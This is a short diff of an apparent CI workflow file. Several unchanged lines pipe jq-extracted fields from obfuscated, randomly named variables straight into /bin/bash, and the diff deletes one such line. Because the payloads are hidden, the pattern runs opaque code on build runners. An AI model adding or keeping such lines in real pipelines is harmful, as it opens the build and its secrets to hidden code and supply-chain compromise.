@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$l87327" | jq -r .cem66911 | /bin/bash
           echo $ptxo23 | jq -r .phrah7 | /bin/bash
           printf '%s' "$oa27" | jq -r .csw4653 | /bin/bash
-          echo $hyffs92770 | jq -r .ohxnj0 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
